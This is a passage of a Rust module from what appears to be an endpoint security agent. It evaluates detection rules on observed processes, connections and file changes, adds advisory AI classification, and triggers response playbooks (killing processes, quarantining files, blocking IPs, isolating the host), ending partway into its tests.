// Copyright (c) 2024-2026 Cyber Threat Consulting
// SPDX-License-Identifier: MIT

//! Autonomous threat detection -> classification -> response pipeline.
//!
//! After each security scan cycle, this module:
//! 1. Evaluates detection rules against live threat data and against the
//!    activity observed on the host (every process and connection, flagged
//!    or not)
//! 2. Classifies matched threats with AI (when LLM available)
//! 3. Triggers matching playbooks automatically
//! 4. Emits events to the GUI for visibility

use crate::playbook_engine::{FimAlertInfo, NetworkAlertInfo, ProcessInfo, ThreatContext};
#[cfg(feature = "llm")]
use tracing::debug;
use tracing::{info, warn};

/// A detection rule match result.
#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub rule_id: String,
    pub rule_name: String,
    pub severity: String,
    pub matched_value: String,
    pub confidence: f32,
    pub ai_classification: Option<String>,
    /// What the condition found, for the rule's actions to act on.
    pub targets: Vec<RuleTarget>,
    pub matched_at: chrono::DateTime<chrono::Utc>,
}

/// Something a rule condition found on the host.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RuleTarget {
    Process {
        name: String,
        pid: u32,
    },
    Connection {
        remote_ip: String,
        port: u16,
    },
    /// A file that changed; `removed`: it no longer exists.
    File {
        path: String,
        removed: bool,
    },
}

impl RuleTarget {
    fn file(alert: &FimAlertInfo) -> Self {
        let change = alert.change_type.to_lowercase();
        Self::File {
            path: alert.path.clone(),
            removed: change.contains("delet") || change.contains("remov"),
        }
    }
}

/// A connection with a remote peer, observed on the host.
#[derive(Debug, Clone)]
pub struct ObservedConnection {
    pub remote_ip: String,
    pub port: u16,
    pub process_name: Option<String>,
}

/// Activity observed on the host during one pass of the main loop, whether or
/// not a detection engine flagged it.
///
/// Only the custom detection rules read it. Playbooks keep evaluating the
/// [`ThreatContext`] alone: they act on the host, so they stay bound to what
/// an engine has flagged.
#[derive(Debug, Default)]
pub struct ObservedActivity {
    pub processes: Vec<ProcessInfo>,
    pub connections: Vec<ObservedConnection>,
}

impl ObservedActivity {
    pub fn is_empty(&self) -> bool {
        self.processes.is_empty() && self.connections.is_empty()
    }

    /// Record processes seen by the scanner. The agent's own process is left
    /// out, as in the scanner, so a rule cannot match the agent itself.
    pub fn add_processes<'a>(
        &mut self,
        processes: impl IntoIterator<Item = &'a agent_scanner::security::process_monitor::ProcessInfo>,
    ) {
        let own_pid = std::process::id();
        self.processes.extend(
            processes
                .into_iter()
                .filter(|p| p.pid != own_pid && !p.name.trim().is_empty())
                .map(|p| ProcessInfo {
                    name: p.name.clone(),
                    pid: p.pid,
                    command_line: p.cmdline.clone().unwrap_or_default(),
                }),
        );
    }

    /// Record the connections that have a remote peer.
    pub fn add_connections(&mut self, connections: &[agent_network::types::NetworkConnection]) {
        self.connections.extend(connections.iter().filter_map(|c| {
            let remote_ip = c.remote_address.as_deref()?.trim();
            let port = c.remote_port.filter(|port| *port != 0)?;
            (!remote_ip.is_empty()).then(|| ObservedConnection {
                remote_ip: remote_ip.to_string(),
                port,
                process_name: c.process_name.clone(),
            })
        }));
    }
}

/// Observations a rule has already reported, so that a long-running process or
/// a persistent connection is reported when it appears, not at every scan.
#[derive(Debug, Default)]
pub struct RuleHitMemory {
    reported: std::collections::HashMap<String, std::time::Instant>,
}

impl RuleHitMemory {
    /// An observation that is still present is reported again after this delay.
    pub const REMINDER: std::time::Duration = std::time::Duration::from_secs(24 * 60 * 60);
    /// Observations remembered; beyond it the oldest half is forgotten.
    const CAPACITY: usize = 20_000;

    /// Whether `key` is to be reported now. It is then remembered.
    fn report(&mut self, key: String, now: std::time::Instant) -> bool {
        if let Some(at) = self.reported.get(&key)
            && now.saturating_duration_since(*at) < Self::REMINDER
        {
            return false;
        }
        if self.reported.len() >= Self::CAPACITY {
            self.forget_oldest(now);
        }
        self.reported.insert(key, now);
        true
    }

    fn forget_oldest(&mut self, now: std::time::Instant) {
        self.reported
            .retain(|_, at| now.saturating_duration_since(*at) < Self::REMINDER);
        if self.reported.len() < Self::CAPACITY {
            return;
        }
        let mut ages: Vec<std::time::Instant> = self.reported.values().copied().collect();
        ages.sort_unstable();
        let median = ages[ages.len() / 2];
        self.reported.retain(|_, at| *at > median);
    }
}

/// What a rule condition found in the observed activity and has not reported
/// yet: a description of the first observation and the number of others,
/// and every observation, for the rule's actions.
fn observed_match(
    rule_id: &str,
    condition: &agent_gui::dto::DetectionCondition,
    observed: &ObservedActivity,
    memory: &mut RuleHitMemory,
    now: std::time::Instant,
) -> Option<(String, Vec<RuleTarget>)> {
    use agent_gui::dto::DetectionConditionType as Kind;

    let needle = condition.value.to_lowercase();
    let mut new_hits: Vec<String> = Vec::new();
    let mut targets: Vec<RuleTarget> = Vec::new();
    match condition.condition_type {
        Kind::ProcessNameContains | Kind::CommandLineContains => {
            let by_name = condition.condition_type == Kind::ProcessNameContains;
            for process in &observed.processes {
                let haystack = if by_name {
                    &process.name
                } else {
                    &process.command_line
                };
                if !haystack.to_lowercase().contains(&needle) {
                    continue;
                }
                let key = format!(
                    "{rule_id}\u{1f}process\u{1f}{}\u{1f}{}",
                    process.pid,
                    process.name.to_lowercase()
                );
                if memory.report(key, now) {
                    new_hits.push(if by_name {
                        format!("Processus {} (PID {})", process.name, process.pid)
                    } else {
                        format!(
                            "Processus {} (PID {}) : {}",
                            process.name,
                            process.pid,
                            excerpt(&process.command_line)
                        )
                    });
                    targets.push(RuleTarget::Process {
                        name: process.name.clone(),
                        pid: process.pid,
                    });
                }
            }
        }
        Kind::NetworkPort => {
            let port = condition.value.trim().parse::<u16>().ok()?;
            for connection in observed.connections.iter().filter(|c| c.port == port) {
                let key = format!(
                    "{rule_id}\u{1f}connection\u{1f}{}\u{1f}{port}",
                    connection.remote_ip
                );
                if memory.report(key, now) {
                    new_hits.push(match &connection.process_name {
                        Some(process) if !process.trim().is_empty() => {
                            format!(
                                "Connexion vers {}:{port} par {process}",
                                connection.remote_ip
                            )
                        }
                        _ => format!("Connexion vers {}:{port}", connection.remote_ip),
                    });
                    targets.push(RuleTarget::Connection {
                        remote_ip: connection.remote_ip.clone(),
                        port,
                    });
                }
            }
        }
        // File changes and alert severities are not raw activity: they are
        // matched in the threat context.
        Kind::FimPathMatch | Kind::SeverityLevel => {}
    }

    let others = new_hits.len().saturating_sub(1);
    let first = new_hits.into_iter().next()?;
    let described = if others > 0 {
        format!(
            "{first} (+{others} autre{})",
            if others > 1 { "s" } else { "" }
        )
    } else {
        first
    };
    Some((described, targets))
}

/// The start of a command line, short enough for a notification.
fn excerpt(command_line: &str) -> String {
    const MAX_CHARS: usize = 160;
    let command_line = command_line.trim();
    if command_line.chars().count() <= MAX_CHARS {
        command_line.to_string()
    } else {
        let start: String = command_line.chars().take(MAX_CHARS).collect();
        format!("{start}\u{2026}")
    }
}

/// The peer of a network alert, when it names one.
fn network_alert_target(alert: &NetworkAlertInfo) -> Vec<RuleTarget> {
    alert
        .remote_ip
        .as_ref()
        .filter(|ip| !ip.trim().is_empty())
        .map(|ip| RuleTarget::Connection {
            remote_ip: ip.clone(),
            port: alert.port.unwrap_or(0),
        })
        .into_iter()
        .collect()
}

/// Evaluate all enabled detection rules against the current threat context
/// and the activity observed on the host.
///
/// A condition matches what a detection engine flagged (`context`) or, for
/// process names, command lines and ports, anything observed on the host
/// (`observed`). An observation is reported once: `memory` remembers it.
///
/// Returns a list of matched rules.
pub fn evaluate_detection_rules(
    rules: &[agent_gui::dto::DetectionRule],
    context: &ThreatContext,
    observed: &ObservedActivity,
    memory: &mut RuleHitMemory,
) -> Vec<RuleMatch> {
    use agent_gui::dto::DetectionConditionType;

    let now = std::time::Instant::now();
    let mut matches = Vec::new();

    for rule in rules {
        if !rule.enabled {
            continue;
        }

        for condition in &rule.conditions {
            // An empty substring matches every entity; malformed rules must not fire.
            if condition.value.trim().is_empty() {
                continue;
            }
            let needle = condition.value.to_lowercase();
            let matched: Option<(String, Vec<RuleTarget>)> = match condition.condition_type {
                DetectionConditionType::ProcessNameContains => context
                    .suspicious_processes
                    .iter()
                    .find(|p| p.name.to_lowercase().contains(&needle))
                    .map(|p| {
                        (
                            format!("Processus {} (PID {})", p.name, p.pid),
                            vec![RuleTarget::Process {
                                name: p.name.clone(),
                                pid: p.pid,
                            }],
                        )
                    }),
                DetectionConditionType::CommandLineContains => context
                    .suspicious_processes
                    .iter()
                    .find(|p| p.command_line.to_lowercase().contains(&needle))
                    .map(|p| {
                        (
                            format!(
                                "Processus {} (PID {}) : {}",
                                p.name,
                                p.pid,
                                excerpt(&p.command_line)
                            ),
                            vec![RuleTarget::Process {
                                name: p.name.clone(),
                                pid: p.pid,
                            }],
                        )
                    }),
                DetectionConditionType::NetworkPort => {
                    if let Ok(port) = condition.value.trim().parse::<u16>() {
                        context
                            .network_alerts
                            .iter()
                            .find(|a| a.port == Some(port))
                            .map(|a| {
                                (
                                    format!(
                                        "Alerte réseau sur le port {} : {}",
                                        port, a.description
                                    ),
                                    network_alert_target(a),
                                )
                            })
                    } else {
                        None
                    }
                }
                DetectionConditionType::FimPathMatch => context
                    .fim_alerts
                    .iter()
                    .find(|f| f.path.to_lowercase().contains(&needle))
                    .map(|f| {
                        (
                            format!("Fichier {} ({})", f.path, f.change_type),
                            vec![RuleTarget::file(f)],
                        )
                    }),
                DetectionConditionType::SeverityLevel => {
                    // Match if any alert has severity >= threshold
                    let Some(threshold) = severity_to_level(&condition.value) else {
                        continue;
                    };
                    context
                        .network_alerts
                        .iter()
                        .find(|a| {
                            severity_to_level(&a.severity).is_some_and(|level| level >= threshold)
                        })
                        .map(|a| {
                            (
                                format!(
                                    "Sévérité {} >= {} : {}",
                                    a.severity, condition.value, a.description
                                ),
                                network_alert_target(a),
                            )
                        })
                }
            };

            // Always evaluated, so what the engines flagged is remembered too
            // and not reported a second time as a plain observation.
            let observed_hit = observed_match(&rule.id, condition, observed, memory, now);

            if let Some((matched_value, targets)) = matched.or(observed_hit) {
                matches.push(RuleMatch {
                    rule_id: rule.id.to_string(),
                    rule_name: rule.name.clone(),
                    severity: rule.severity.as_str().to_string(),
                    matched_value,
                    confidence: 0.7, // Deterministic rule confidence; AI is advisory.
                    ai_classification: None,
                    targets,
                    matched_at: chrono::Utc::now(),
                });
            }
        }
    }

    matches
}

/// Annotate rule matches with advisory AI classification without suppressing evidence.
#[cfg(feature = "llm")]
pub async fn ai_classify_matches(
    matches: &mut [RuleMatch],
    llm_service: &crate::llm_service::LLMService,
) {
    if !llm_service.is_available().await {
        return;
    }

    let manager = match llm_service.get_manager().await {
        Some(m) => m,
        None => return,
    };

    for rule_match in matches.iter_mut().take(10) {
        let event = agent_llm::SecurityEvent {
            id: uuid::Uuid::new_v4().to_string(),
            event_type: format!("detection_rule:{}", rule_match.rule_id),
            description: format!(
                "Detection rule '{}' matched: {}",
                rule_match.rule_name, rule_match.matched_value
            ),
            system_info: std::env::consts::OS.to_string(),
            historical_context: String::new(),
            timestamp: chrono::Utc::now(),
            source: "detection_engine".to_string(),
            severity: rule_match.severity.clone(),
            raw_data: serde_json::json!({
                "rule_name": rule_match.rule_name,
                "matched_value": rule_match.matched_value,
            }),
        };

        match manager.classifier().classify_event(&event).await {
            Ok(classification) => {
                // AI enriches evidence but cannot erase or promote the rule verdict.
                // Model confidence is recorded in the annotation only.
                rule_match.ai_classification = Some(format!(
                    "{:?} (threat: {:?}, confidence: {}%)",
                    classification.threat_type,
                    classification.threat_level,
                    classification.confidence,
                ));
                debug!(
                    "AI classified rule '{}': {:?} confidence={}%",
                    rule_match.rule_name, classification.threat_type, classification.confidence
                );
            }
            Err(e) => {
                debug!(
                    "AI classification failed for rule '{}': {}",
                    rule_match.rule_name, e
                );
            }
        }
    }
}

/// Result of running the full threat pipeline.
pub struct PipelineResult {
    /// Detection rule matches (for upload to platform).
    pub rule_matches: Vec<RuleMatch>,
    /// Playbook execution log entries (for upload to platform).
    pub playbook_logs: Vec<agent_gui::dto::PlaybookLogEntry>,
}

/// Run the full autonomous pipeline: detect -> classify -> respond.
///
/// Call this after each security scan cycle in the main loop.
/// Returns the detection rule matches and playbook logs for sync to the platform.
///
/// With `simulate_playbooks`, triggered playbooks act on nothing: what they
/// would have done is recorded in their log entry instead.
#[allow(clippy::too_many_arguments)]
pub async fn run_threat_pipeline(
    rules: &[agent_gui::dto::DetectionRule],
    playbooks: &[agent_gui::dto::Playbook],
    context: &ThreatContext,
    observed: &ObservedActivity,
    rule_memory: &mut RuleHitMemory,
    gui_tx: &Option<std::sync::mpsc::Sender<agent_gui::events::AgentEvent>>,
    #[cfg(feature = "llm")] llm_service: Option<&crate::llm_service::LLMService>,
    audit_trail: Option<&std::sync::Arc<crate::audit_trail::LocalAuditTrail>>,
    siem: Option<&agent_siem::SiemForwarder>,
    simulate_playbooks: bool,
) -> PipelineResult {
    // Step 1: Evaluate detection rules
    #[allow(unused_mut)]
    let mut matches = evaluate_detection_rules(rules, context, observed, rule_memory);

    info!(
        "Threat pipeline: {} detection rule matches found",
        matches.len()
    );

    // Step 2: AI classification (if available)
    #[cfg(feature = "llm")]
    if let Some(svc) = llm_service {
        ai_classify_matches(&mut matches, svc).await;
    }

    // Step 3: Find and trigger matching playbooks
    let mut playbook_logs = Vec::new();
    for playbook in playbooks {
        if !playbook.enabled {
            continue;
        }

        let evaluation = crate::playbook_engine::evaluate_playbook(
            playbook,
            context,
            #[cfg(feature = "llm")]
            llm_service,
        )
        .await;

        if evaluation.triggered {
            info!(
                "Playbook '{}' triggered with confidence {:.2}",
                evaluation.playbook_name, evaluation.confidence
            );

            // Execute the playbook actions, or record what they would do
            let results = if simulate_playbooks {
                crate::playbook_engine::simulate_playbook_actions(
                    &evaluation.playbook_name,
                    &evaluation.actions,
                    audit_trail,
                )
                .await
            } else {
                // An address blocked again within a day is blocked longer.
                let actions = crate::playbook_engine::escalate_repeated_blocks(&evaluation.actions);
                crate::playbook_engine::execute_playbook_actions_with_delivery(
                    &evaluation.playbook_name,
                    &actions,
                    audit_trail,
                    gui_tx.as_ref(),
                    siem,
                )
                .await
            };

            let success_count = results.iter().filter(|r| r.success).count();
            let total = results.len();

            if simulate_playbooks {
                info!(
                    "Playbook '{}' simulated: {} of {} action(s) would run, nothing was changed",
                    evaluation.playbook_name, success_count, total
                );
            } else {
                info!(
                    "Playbook '{}' executed: {}/{} actions succeeded",
                    evaluation.playbook_name, success_count, total
                );
            }

            // Build playbook log entry
            let log_entry = agent_gui::dto::PlaybookLogEntry {
                id: uuid::Uuid::new_v4(),
                playbook_id: playbook.id.clone(),
                playbook_name: evaluation.playbook_name.clone(),
                triggered_at: chrono::Utc::now(),
                trigger_event: evaluation.matched_conditions.join("; "),
                actions_executed: results.iter().map(|r| r.action.clone()).collect(),
                success: total > 0 && success_count == total,
                error: if total == 0 {
                    Some("No executable action resolved for the configured playbook".into())
                } else if success_count < total {
                    Some(
                        results
                            .iter()
                            .filter_map(|r| r.error.as_ref())
                            .cloned()
                            .collect::<Vec<_>>()
                            .join("; "),
                    )
                } else {
                    None
                },
            };

            // Collect for platform sync
            playbook_logs.push(log_entry.clone());

            // Emit playbook triggered event to GUI
            if let Some(tx) = gui_tx
                && let Err(e) = tx.send(agent_gui::events::AgentEvent::PlaybookTriggered {
                    log_entry: Box::new(log_entry),
                })
            {
                warn!("Failed to send PlaybookTriggered event: {}", e);
            }
        }
    }

    // Step 4: the responses chosen on each rule that matched, then the
    // notification of the match, which says what they did.
    for rule_match in &matches {
        let rule = rules.iter().find(|rule| rule.id == rule_match.rule_id);
        let actions = rule
            .map(|rule| resolve_rule_actions(rule, rule_match))
            .unwrap_or_default();
        let label = format!("Règle « {} »", rule_match.rule_name);
        let actions = if simulate_playbooks {
            actions
        } else {
            // An address blocked again within a day is blocked longer.
            crate::playbook_engine::escalate_repeated_blocks(&actions)
        };
        let results = if actions.is_empty() {
            Vec::new()
        } else if simulate_playbooks {
            crate::playbook_engine::simulate_playbook_actions(&label, &actions, audit_trail).await
        } else {
            crate::playbook_engine::execute_playbook_actions_with_delivery(
                &label,
                &actions,
                audit_trail,
                gui_tx.as_ref(),
                siem,
            )
            .await
        };
        if !results.is_empty() {
            info!(
                "{}: {} of {} response action(s) {}",
                label,
                results.iter().filter(|r| r.success).count(),
                results.len(),
                if simulate_playbooks {
                    "simulated"
                } else {
                    "succeeded"
                }
            );
        }

        if let Some(tx) = gui_tx {
            let notification = agent_gui::dto::GuiNotification {
                id: uuid::Uuid::new_v4(),
                title: format!("Règle « {} » déclenchée", rule_match.rule_name),
                body: rule_notification_body(rule_match, &actions, &results, simulate_playbooks),
                severity: rule_match.severity.clone(),
                timestamp: rule_match.matched_at,
                read: false,
                action: None,
            };
            if let Err(e) = tx.send(agent_gui::events::AgentEvent::Notification { notification }) {
                warn!("Failed to send detection rule notification: {}", e);
            }
            let _ = tx.send(agent_gui::events::AgentEvent::DetectionRuleMatched {
                rule_id: rule_match.rule_id.clone(),
                matched_at: rule_match.matched_at,
            });
        }
    }

    PipelineResult {
        rule_matches: matches,
        playbook_logs,
    }
}

/// The responses a rule asks for, applied to what its condition found: the
/// processes are stopped, the files put in quarantine, the remote addresses
/// blocked. A response with nothing to act on is left out (a quarantine for
/// a connection, a file that was removed). Locking an account and running a
/// response command need a parameter a rule does not have: playbooks do
/// that. Every match is notified anyway: the notification is not an action.
pub fn resolve_rule_actions(
    rule: &agent_gui::dto::DetectionRule,
    rule_match: &RuleMatch,
) -> Vec<crate::playbook_engine::ResolvedAction> {
    use crate::playbook_engine::{DEFAULT_BLOCK_SECS, ResolvedAction, isolation_duration};
    use agent_gui::dto::PlaybookActionType as Action;

    let mut resolved: Vec<ResolvedAction> = Vec::new();
    let mut push = |action: ResolvedAction| {
        if !resolved.contains(&action) {
            resolved.push(action);
        }
    };
    for action in &rule.actions {
        match action {
            Action::KillProcess => {
                for target in &rule_match.targets {
                    if let RuleTarget::Process { name, pid } = target {
                        push(ResolvedAction::KillProcess {
                            name: name.clone(),
                            pid: *pid,
                        });
                    }
                }
            }
            Action::QuarantineFile => {
                for target in &rule_match.targets {
                    if let RuleTarget::File {
                        path,
                        removed: false,
                    } = target
                    {
                        push(ResolvedAction::QuarantineFile { path: path.clone() });
                    }
                }
            }
            Action::BlockIp => {
                for target in &rule_match.targets {
                    if let RuleTarget::Connection { remote_ip, .. } = target {
                        push(ResolvedAction::BlockIp {
                            ip: remote_ip.clone(),
                            duration_secs: DEFAULT_BLOCK_SECS,
                        });
                    }
                }
            }
            Action::IsolateHost => push(ResolvedAction::IsolateHost {
                duration_secs: isolation_duration(""),
            }),
            Action::SendSiemAlert => push(ResolvedAction::Alert {
                title: format!("Règle « {} » déclenchée", rule.name),
                severity: rule.severity.as_str().to_string(),
                description: rule_match.matched_value.clone(),
            }),
            Action::CreateNotification | Action::DisableAccount | Action::RunCommand => {}
        }
    }
    resolved
}

/// What a rule found, its AI reading when there is one, and what its
/// responses did (`results` holds one result per action, in order).
fn rule_notification_body(
    rule_match: &RuleMatch,
    actions: &[crate::playbook_engine::ResolvedAction],
    results: &[crate::playbook_engine::ActionResult],
    simulated: bool,
) -> String {
    let mut body = rule_match.matched_value.clone();
    if let Some(classification) = &rule_match.ai_classification {
        body.push_str(&format!("\nAnalyse IA : {classification}"));
    }
    for (action, result) in actions.iter().zip(results) {
        let what = response_label(action);
        body.push_str(&match &result.error {
            None if simulated => format!("\nSimulation, rien n'a été fait : {what}"),
            None => format!("\nRéponse : {what}"),
            Some(error) => format!("\nRéponse en échec : {what} ({error})"),
        });
    }
    body
}

/// A rule's response, as the notification says it.
fn response_label(action: &crate::playbook_engine::ResolvedAction) -> String {
    use crate::playbook_engine::ResolvedAction;
    match action {
        ResolvedAction::KillProcess { name, pid } => {
            format!("arrêt du processus {name} (PID {pid})")
        }
        ResolvedAction::QuarantineFile { path } => format!("mise en quarantaine de {path}"),
        ResolvedAction::BlockIp { ip, duration_secs } => match duration_secs {
            0 => format!("blocage de {ip} jusqu'au déblocage"),
            secs => format!(
                "blocage de {ip} pendant {}",
                agent_gui::format::duration_short(*secs)
            ),
        },
        ResolvedAction::IsolateHost { .. } => "isolement du poste".to_string(),
        ResolvedAction::Alert { .. } => "alerte envoyée au SIEM".to_string(),
        ResolvedAction::Notify { .. } => "notification".to_string(),
        ResolvedAction::DisableAccount { user, .. } => format!("verrouillage du compte {user}"),
        ResolvedAction::RunCommand { name, .. } => format!("commande de réponse {name}"),
    }
}

/// Convert a single stored detection rule to GUI DTO.
pub fn stored_rule_to_single_dto(
    s: &agent_storage::repositories::grc::StoredDetectionRule,
) -> agent_gui::dto::DetectionRule {
    let id = s.id.clone();
    let severity = match s.severity.to_lowercase().as_str() {
        "critical" => agent_gui::dto::Severity::Critical,
        "high" => agent_gui::dto::Severity::High,
        "medium" => agent_gui::dto::Severity::Medium,
        "low" => agent_gui::dto::Severity::Low,
        "info" => agent_gui::dto::Severity::Info,
        _ => agent_gui::dto::Severity::Medium,
    };
    let conditions = serde_json::from_str::<Vec<agent_gui::dto::DetectionCondition>>(&s.conditions);
    let actions = serde_json::from_str::<Vec<agent_gui::dto::PlaybookActionType>>(&s.actions);
    let valid = conditions.is_ok() && actions.is_ok();
    if !valid {
        warn!(
            "Detection rule {} disabled: incompatible conditions or actions",
            s.id
        );
    }
    let created_at = chrono::DateTime::parse_from_rfc3339(&s.created_at)
        .map(|dt| dt.with_timezone(&chrono::Utc))
        .unwrap_or_else(|_| chrono::Utc::now());
    agent_gui::dto::DetectionRule {
        id,
        name: s.name.clone(),
        description: s.description.clone(),
        severity,
        conditions: conditions.unwrap_or_default(),
        actions: actions.unwrap_or_default(),
        enabled: s.enabled && valid,
        created_at,
        last_match: s
            .last_match
            .as_deref()
            .and_then(|v| chrono::DateTime::parse_from_rfc3339(v).ok())
            .map(|dt| dt.with_timezone(&chrono::Utc)),
        match_count: s.match_count.max(0) as u32,
    }
}

/// A detection rule as the database stores it; `synced`: the platform has
/// this version.
pub fn rule_to_stored(
    rule: &agent_gui::dto::DetectionRule,
    synced: bool,
) -> agent_storage::repositories::grc::StoredDetectionRule {
    agent_storage::repositories::grc::StoredDetectionRule {
        id: rule.id.clone(),
        name: rule.name.clone(),
        description: rule.description.clone(),
        severity: rule.severity.as_str().to_string(),
        conditions: serde_json::to_string(&rule.conditions).unwrap_or_else(|_| "[]".into()),
        actions: serde_json::to_string(&rule.actions).unwrap_or_else(|_| "[]".into()),
        enabled: rule.enabled,
        created_at: rule.created_at.to_rfc3339(),
        last_match: rule.last_match.map(|d| d.to_rfc3339()),
        match_count: rule.match_count.min(i32::MAX as u32) as i32,
        synced,
    }
}

/// Convert stored detection rules from the database into GUI DTOs for pipeline evaluation.
pub fn stored_rules_to_dto(
    stored: &[agent_storage::repositories::grc::StoredDetectionRule],
) -> Vec<agent_gui::dto::DetectionRule> {
    stored.iter().map(stored_rule_to_single_dto).collect()
}

/// Convert a single stored playbook to GUI DTO.
pub fn stored_playbook_to_single_dto(
    s: &agent_storage::repositories::grc::StoredPlaybook,
) -> agent_gui::dto::Playbook {
    let id = s.id.clone();
    let actions = serde_json::from_str::<Vec<agent_gui::dto::PlaybookAction>>(&s.steps);
    let conditions = serde_json::from_str::<Vec<agent_gui::dto::PlaybookCondition>>(&s.conditions);
    let valid = conditions.is_ok() && actions.is_ok();
    if !valid {
        warn!(
            "Playbook {} disabled: incompatible conditions or actions",
            s.id
        );
    }
    let created_at = chrono::DateTime::parse_from_rfc3339(&s.created_at)
        .map(|dt| dt.with_timezone(&chrono::Utc))
        .unwrap_or_else(|_| chrono::Utc::now());
    agent_gui::dto::Playbook {
        id,
        name: s.name.clone(),
        description: s.description.clone(),
        enabled: s.enabled && valid,
        conditions: conditions.unwrap_or_default(),
        actions: actions.unwrap_or_default(),
        created_at,
        last_triggered: None,
        trigger_count: 0,
        is_template: false,
    }
}

/// Convert stored playbooks from the database into GUI DTOs for pipeline evaluation.
pub fn stored_playbooks_to_dto(
    stored: &[agent_storage::repositories::grc::StoredPlaybook],
) -> Vec<agent_gui::dto::Playbook> {
    stored.iter().map(stored_playbook_to_single_dto).collect()
}

/// Build a `ThreatContext` from security scan incidents, network alerts, and FIM alerts.
///
/// This is the glue function that converts heterogeneous scan results into
/// the unified `ThreatContext` consumed by the detection and playbook engines.
pub fn build_threat_context(
    incidents: &[agent_scanner::SecurityIncident],
    network_alerts: &[agent_network::NetworkSecurityAlert],
    fim_alerts: &[(String, String)], // (path, change_type)
) -> ThreatContext {
    let suspicious_processes = incidents
        .iter()
        .filter_map(|incident| {
            // Consume any incident carrying valid process evidence, including
            // malware and credential theft, not only three incident categories.
            let evidence = &incident.evidence;
            let name = evidence.get("process_name").and_then(|v| v.as_str())?;
            let pid = u32::try_from(evidence.get("pid")?.as_u64()?).ok()?;
            if !name.trim().is_empty() && pid > 1 {
                let command_line = evidence
                    .get("cmdline")
                    .and_then(|v| v.as_str())
                    .or_else(|| evidence.get("command_line").and_then(|v| v.as_str()))
                    .unwrap_or("")
                    .to_string();
                Some(ProcessInfo {
                    name: name.to_string(),
                    pid,
                    command_line,
                })
            } else {
                None
            }
        })
        .collect();

    let mut net_alerts: Vec<NetworkAlertInfo> = network_alerts
        .iter()
        .map(|alert| {
            let severity_str = match alert.severity {
                agent_network::types::AlertSeverity::Critical => "critical",
                agent_network::types::AlertSeverity::High => "high",
                agent_network::types::AlertSeverity::Medium => "medium",
                agent_network::types::AlertSeverity::Low => "low",
            };
            let (remote_ip, port) = if let Some(conn) = &alert.connection {
                (conn.remote_address.clone(), conn.remote_port)
            } else {
                (None, None)
            };
            NetworkAlertInfo {
                alert_type: network_alert_type(alert.alert_type).to_string(),
                remote_ip,
                port,
                severity: severity_str.to_string(),
                description: alert.description.clone(),
                user: None,
            }
        })
        .collect();

    // A detection on the logs that names a remote address (a brute force, a
    // web attack) is a network alert for the playbooks: its source can be
    // blocked like the peer of a suspicious connection.
    net_alerts.extend(incidents.iter().filter_map(|incident| {
        let evidence = &incident.evidence;
        if evidence.get("detection")?.as_str()? != "sigma_log" {
            return None;
        }
        let address = evidence.get("event")?.get("src_ip")?.as_str()?;
        address.parse::<std::net::IpAddr>().ok()?;
        Some(NetworkAlertInfo {
            alert_type: log_detection_type(evidence).to_string(),
            remote_ip: Some(address.to_string()),
            port: None,
            severity: incident.severity.to_string(),
            description: incident.title.clone(),
            // The account of a session that was opened: the one that was
            // taken. The accounts merely tried are not named.
            user: (evidence["event"]["action"] == "login_success")
                .then(|| evidence["event"]["user"].as_str())
                .flatten()
                .map(str::to_string),
        })
    }));

    let fim = fim_alerts
        .iter()
        .map(|(path, change_type)| FimAlertInfo {
            path: path.clone(),
            change_type: change_type.clone(),
        })
        .collect();

    ThreatContext {
        suspicious_processes,
        network_alerts: net_alerts,
        fim_alerts: fim,
    }
}

/// The name a playbook condition gives a type of network alert.
fn network_alert_type(kind: agent_network::types::NetworkAlertType) -> &'static str {
    use agent_network::types::NetworkAlertType as Kind;
    match kind {
        Kind::C2Communication => "c2_communication",
        Kind::CryptoMining => "crypto_mining",
        Kind::DataExfiltration => "data_exfiltration",
        Kind::SuspiciousPort => "suspicious_port",
        Kind::MaliciousDestination => "malicious_destination",
        Kind::DnsTunneling => "dns_tunneling",
        Kind::AnonymizationNetwork => "anonymization_network",
        Kind::ConnectionAnomaly => "connection_anomaly",
    }
}

/// The name a playbook condition gives a detection on the logs, from its
/// ATT&CK techniques: a brute force (T1110 and its sub-techniques, password
/// spraying included) is `brute_force`, anything else `log_detection`.
fn log_detection_type(evidence: &serde_json::Value) -> &'static str {
    let brute_force = evidence["attack_techniques"]
        .as_array()
        .is_some_and(|techniques| {
            techniques
                .iter()
                .filter_map(|technique| technique.as_str())
                .any(|technique| technique.to_ascii_uppercase().starts_with("T1110"))
        });
    if brute_force {
        "brute_force"
    } else {
        "log_detection"
    }
}

fn severity_to_level(severity: &str) -> Option<u8> {
    match severity.trim().to_lowercase().as_str() {
        "critical" => Some(4),
        "high" => Some(3),
        "medium" => Some(2),
        "low" => Some(1),
        "info" => Some(0),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use agent_scanner::{IncidentSeverity, IncidentType, SecurityIncident};

    /// Rules evaluated on what the engines flagged only, as before raw activity.
    fn evaluate(
        rules: &[agent_gui::dto::DetectionRule],
        context: &ThreatContext,
    ) -> Vec<RuleMatch> {
        evaluate_detection_rules(
            rules,
            context,
            &ObservedActivity::default(),
            &mut RuleHitMemory::default(),
        )
    }

    fn incident(kind: IncidentType, evidence: serde_json::Value) -> SecurityIncident {
        SecurityIncident::new(kind, IncidentSeverity::High, "test", "test").with_evidence(evidence)
    }

    /// A detection on the logs that names an address can have that address
    /// blocked; the account is named only when it was taken.
    #[test]
    fn a_log_detection_gives_the_playbooks_its_address_and_the_account_taken() {
        let log = |action: &str, address: &str| {
            incident(
                IncidentType::CredentialTheft,
                serde_json::json!({
                    "detection": "sigma_log",
                    "event": { "src_ip": address, "user": "deploy", "action": action },
                }),
            )
        };
        let context = build_threat_context(
            &[
                log("login_success", "203.0.113.9"),
                log("login_failed", "198.51.100.7"),
                // No address, or not one: nothing to block.
                log("login_success", "bastion.example"),
                incident(
                    IncidentType::Malware,
                    serde_json::json!({"detection": "yara"}),
                ),
            ],
            &[],
            &[],
        );
        let alerts: Vec<(Option<&str>, Option<&str>)> = context
            .network_alerts
            .iter()
            .map(|alert| (alert.remote_ip.as_deref(), alert.user.as_deref()))
            .collect();
        assert_eq!(
            alerts,
            [
                (Some("203.0.113.9"), Some("deploy")),
                (Some("198.51.100.7"), None),
            ]
        );
        assert_eq!(context.network_alerts[0].severity, "high");
    }

    /// The shipped "Brute-force" playbook asks for the alert type
    /// `brute_force`; a brute force found in the logs is titled in French.
    /// It used to be matched on its title, and so never matched.
    #[tokio::test]
